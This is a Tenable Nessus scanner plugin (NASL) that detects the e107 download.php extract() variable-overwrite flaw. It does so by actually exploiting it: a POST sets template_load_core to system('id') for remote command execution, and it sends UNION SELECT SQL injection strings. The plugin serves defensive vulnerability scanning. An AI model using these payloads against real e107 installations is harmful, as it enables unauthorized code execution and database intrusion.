#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(33856);
  script_version("$Revision: 1.5 $");

  script_bugtraq_id(30601);
  script_xref(name:"Secunia", value:"31394");
  script_xref(name:"OSVDB", value:"47482");

  script_name(english:"e107 download.php extract() Function Variable Overwrite");
  script_summary(english:"Tries to execute a command");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
variable overwriting vulnerability." );
 script_set_attribute(attribute:"description", value:
"The version of e107 installed on the remote host allows contains an
unsafe call to 'extract()' in the 'download.php' script.  An
unauthenticated remote attacker can leverage this issue to overwrite
arbitrary PHP variables, leading to arbitrary PHP code execution, SQL
injection, as well as other sorts of attacks." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2008-03/0373.html" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("e107_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

cmd = "id";
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";

# Test an install.
install = get_kb_item(string("www/", port, "/e107"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];
  url = string(dir, "/download.php");

  # Pull up the affected script.
  r = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it looks correct...
  if (
    "/e107_files/" >< res && 
    ": Downloads</title>" >< res
  )
  {
    # Find a valid download category.
    cat = NULL;

    pat = "<a href='download\.php\?list\.([0-9]+)'";
    matches = egrep(pattern:pat, string:res);
    if (matches)
    {
      foreach match (split(matches))
      {
        match = chomp(match);
        item = eregmatch(pattern:pat, string:match);
        if (!isnull(item))
        {
          cat = item[1];
          break;
        }
      }
    }

    # If we found one...
    if (cat)
    {
      # Try to exploit the issue to run a command.
      postdata = string(
        "view=1&",
        "action=maincats&",
        "template_load_core=system(", urlencode(str:cmd), ");"
      );
      url2 = string(url, "?1.list.", cat);

      r = http_send_recv3(method: "POST ", item: url2, port: port,
      	add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"),
	data: postdata);
      if (isnull(r)) exit(0);
      res = r[2];

      if (egrep(pattern:cmd_pat, string:res))
      {
        if (report_verbosity)
        {
          report = string(
            "\n",
            "Nessus was able to execute the command '", cmd, "' on the remote \n",
            "host using the following URL :\n",
            "\n",
            "  ", build_url(port:port, qs:url2), "\n",
            "\n",
            "and with the following POST data :\n",
            "\n",
            "  ", str_replace(find:"&", replace:'\n  ', string:postdata), "\n"
          );
          if (report_verbosity > 1)
          {
            output = strstr(res, "main_section'>uid=") - "main_section'>";
            output = output - strstr(output, '\n');
            if (!output || !egrep(pattern:cmd_pat, string:output)) output = res;

            report = string(
              report,
              "\n",
              "This produced the following output :\n",
              "\n",
              "  ", output, "\n"
            );
          }
          security_hole(port:port, extra:report);
        }
        else security_hole(port);
        exit(0);
      }
    }

    # Try the SQL injection.
    magic = rand();
    exploits = make_list(
      string("-99') UNION SELECT ", magic, ",2,3,4-- "),
      string("-99' UNION SELECT ", magic, ",2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9-- ")
    );
    url2 = string(url, "?1.list");

    foreach exploit (exploits)
    {
      postdata = string(
        "view=1&",
        "id=", urlencode(str:exploit)
      );

      r = http_send_recv3(method: "POST ", item:url2, port: port,
        add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"),
	data: postdata);
      if (isnull(r)) exit(0);
      res = r[2];

      # There's a problem if we could manipulate the title.
      if (
        (')' >< exploit && string(" / ", magic, "</title>") >< res) ||
        string("download.php?view.", magic, "'>") >< res
      )
      {
        security_hole(port);
        set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
        exit(0);
      }
    }
  }
}
